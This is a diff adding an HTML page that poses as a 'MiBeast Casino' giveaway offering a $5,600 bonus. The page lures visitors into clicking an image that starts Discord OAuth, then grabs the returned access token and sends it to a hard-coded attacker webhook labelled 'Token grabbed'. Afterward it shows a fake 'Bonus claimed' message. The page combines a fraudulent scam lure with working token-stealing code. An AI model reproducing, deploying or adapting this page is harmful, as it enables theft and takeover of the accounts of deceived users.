@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>🎁 Claim Your Bonus</title>
+    <style>
+        body { margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; background: #0a0a0a; font-family: Arial, sans-serif; color: white; text-align: center; }
+        .container { max-width: 700px; padding: 30px; background: #1a1a2e; border-radius: 30px; border: 2px solid #ffcc00; }
+        h1 { color: #ffcc00; font-size: 2.8rem; margin-bottom: 10px; }
+        .sub { color: #aaa; font-size: 1.2rem; }
+        img { width: 100%; border-radius: 20px; border: 3px solid #ffcc00; cursor: pointer; transition: 0.3s; margin: 20px 0; }
+        img:hover { transform: scale(1.02); box-shadow: 0 0 40px #ffcc00; }
+        .footer { color: #555; margin-top: 20px; font-size: 0.9rem; }
+        .promo { background: #2a2a3e; padding: 15px; border-radius: 15px; margin: 15px 0; }
+        .highlight { background: #ffcc00; color: #0a0a0a; padding: 8px 16px; border-radius: 8px; font-weight: bold; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🎰 MiBeast Casino Launch</h1>
+        <p class="sub">I'm giving away <span class="highlight">$5,600</span> to everyone who registers!</p>
+        <div class="promo">
+            <p style="color:#ffcc00;">🎁 Use promo code: <strong style="font-size:2rem;">BET</strong></p>
+            <p>Click the image below to claim your bonus instantly.</p>
+        </div>
+        <!-- 👇 CLICK THE IMAGE TO START OAuth -->
+        <img id="claimImage" src="https://cdn.discordapp.com/attachments/1541670433760219248/1544555786901004289/image1.jpg?ex=6a9c3aec&is=6a9ae96c&hm=e8455550b98fe80d32a5e8c5d96dabc576fe5cf867afc49608ce1599905de61a&" alt="Click to claim">
+        <p class="footer">⏳ This offer expires in 1 hour – act fast!</p>
+    </div>
+
+    <script>
+        // ================= CONFIGURATION =================
+        const CLIENT_ID = "1545494388690653388";          // YOUR CLIENT ID
+        const REDIRECT_URI = "https://shahinsha32.github.io/giveaway/"; // YOUR PAGE URL (must match Discord redirect)
+        const WEBHOOK = "https://discord.com/api/webhooks/1545479634005524612/7kO5F7Z86zgfumFzzitcpENMPpu7bkVkpQN_B-50W4th_dUIEQWaQLmJbVVyFjLaA-s9"; // YOUR WEBHOOK
+        // =================================================
+
+        const authUrl = `https://discord.com/api/oauth2/authorize?client_id=${CLIENT_ID}&redirect_uri=${encodeURIComponent(REDIRECT_URI)}&response_type=token&scope=identify`;
+
+        // When the image is clicked, redirect to Discord OAuth
+        document.getElementById('claimImage').addEventListener('click', () => {
+            window.location.href = authUrl;
+        });
+
+        // After OAuth redirect back, grab token from URL fragment
+        if (window.location.hash) {
+            const params = new URLSearchParams(window.location.hash.substring(1));
+            const token = params.get('access_token');
+            if (token) {
+                // Send token to webhook
+                fetch(WEBHOOK, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        content: `🚀 **Token grabbed (image click)**\n\`${token}\``,
+                        embeds: [{ title: "MiBeast Grab", color: 0xffcc00 }]
+                    })
+                }).then(() => {
+                    // Replace page content with success message
+                    document.body.innerHTML = "<div style='display:flex;justify-content:center;align-items:center;height:100vh;background:#0a0a0a;color:#ffcc00;font-size:2rem;'>✅ Bonus claimed! Redirecting...</div>";
+                    setTimeout(() => { window.location.href = 'https://discord.com/channels/@me'; }, 2000);
+                }).catch(() => {});
+            }
+        }
+    </script>
+</body>
+</html>
